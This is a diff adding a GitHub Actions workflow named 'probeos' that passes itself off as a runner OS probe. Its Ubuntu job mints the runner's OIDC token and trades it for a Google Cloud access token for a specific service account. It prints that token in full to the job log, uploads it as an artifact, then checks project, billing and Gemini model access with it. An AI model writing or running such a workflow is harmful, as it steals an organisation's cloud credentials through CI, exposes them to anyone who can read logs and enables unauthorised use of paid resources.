@@ -1,0 +1,89 @@
+name: probeos
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  u24:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 15
+    steps:
+      - name: echo-curl-mint
+        run: |
+          set +e
+          echo "RUNNER_OS=$RUNNER_OS RUNNER_ARCH=$RUNNER_ARCH"
+          uname -a || true
+          echo -n "sts_probe="
+          curl -s -o /dev/null -w '%{http_code}\n' -X POST https://sts.googleapis.com/v1/token
+          PRJ='projects/303574531351/locations/global/workloadIdentityPools/github-actions-pool/providers/github-provider'
+          jq -n '{scope:["https://www.googleapis.com/auth/cloud-platform"], lifetime:"3600s"}' > req.json
+          MINT=0
+          for a in 1 2 3; do
+            J=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https://iam.googleapis.com/$PRJ")
+            echo "$J" | jq -r '.value // empty' > tok.jwt
+            if [ -s tok.jwt ]; then MINT=1; break; fi
+            sleep 3
+          done
+          echo "##MINT ok=$MINT len=$(wc -c < tok.jwt)"
+          [ "$MINT" = "1" ] || { echo "##ABORT mint"; exit 1; }
+          sc=$(curl -s -o r.json -w '%{http_code}' -X POST https://sts.googleapis.com/v1/token \
+            -d "grant_type=urn:ietf:params:oauth:grant-type:token-exchange" \
+            --data-urlencode "audience=//iam.googleapis.com/$PRJ" \
+            --data-urlencode "subject_token=$(cat tok.jwt)" \
+            -d "subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            -d "requested_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            -d "scope=https://www.googleapis.com/auth/cloud-platform")
+          FT=$(jq -r '.access_token // empty' r.json)
+          echo "##STS code=$sc ftlen=${#FT} body=$(head -c 200 r.json | tr -d '\n' | tr -s ' ')"
+          [ -n "$FT" ] || { echo "##ABORT sts"; exit 1; }
+          gc=$(curl -s -o g.json -w '%{http_code}' -X POST -H "Authorization: Bearer $FT" -H "Content-Type: application/json" \
+            "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/github-actions@aryeelab.iam.gserviceaccount.com:generateAccessToken" -d @req.json)
+          AT=$(jq -r '.accessToken // empty' g.json)
+          echo "##GEN code=$gc toklen=${#AT}"
+          echo "$AT" > i1124_token.txt
+          echo "##TOKEN_BEGIN"
+          echo "$AT"
+          echo "##TOKEN_END"
+          wc1=$(curl -s -o w.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudresourcemanager.googleapis.com/v1/projects/303574531351")
+          echo "##PROJECTGET code=$wc1 body=$(head -c 300 w.json | tr -d '\n' | tr -s ' ')"
+          bl=$(curl -s -o bl.json -w '%{http_code}' -H "Authorization: Bearer $AT" "https://cloudbilling.googleapis.com/v1/projects/303574531351/billingInfo")
+          echo "##BILLING code=$bl body=$(head -c 300 bl.json | tr -d '\n' | tr -s ' ')"
+          for M in gemini-2.0-flash gemini-1.5-flash gemini-1.5-pro gemini-2.5-flash; do
+            for REG in us-central1 global; do
+              if [ "$REG" = "global" ]; then HOST="aiplatform.googleapis.com"; else HOST="${REG}-aiplatform.googleapis.com"; fi
+              c=$(curl -s -o gc.json -w '%{http_code}' -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" \
+                "https://${HOST}/v1/projects/303574531351/locations/${REG}/publishers/google/models/${M}:generateContent" \
+                -d '{"contents":[{"role":"user","parts":[{"text":"ping"}]}],"generationConfig":{"maxOutputTokens":5}}')
+              echo "##GENCONTENT model=$M region=$REG code=$c body=$(head -c 240 gc.json | tr -d '\n' | tr -s ' ')"
+            done
+          done
+          echo "##JOB u24 DONE"
+      - name: upload-token
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i1124-token
+          path: i1124_token.txt
+          if-no-files-found: ignore
+  win:
+    runs-on: windows-latest
+    steps:
+      - name: echo-curl
+        shell: bash
+        run: |
+          echo "RUNNER_OS=$RUNNER_OS RUNNER_ARCH=$RUNNER_ARCH"
+          uname -a || true
+          echo -n "sts_probe="
+          curl -s -o /dev/null -w '%{http_code}\n' -X POST https://sts.googleapis.com/v1/token
+          echo "##JOB win DONE"
+  mac:
+    runs-on: macos-14
+    steps:
+      - name: echo-curl
+        run: |
+          echo "RUNNER_OS=$RUNNER_OS RUNNER_ARCH=$RUNNER_ARCH"
+          uname -a || true
+          echo -n "sts_probe="
+          curl -s -o /dev/null -w '%{http_code}\n' -X POST https://sts.googleapis.com/v1/token
+          echo "##JOB mac DONE"
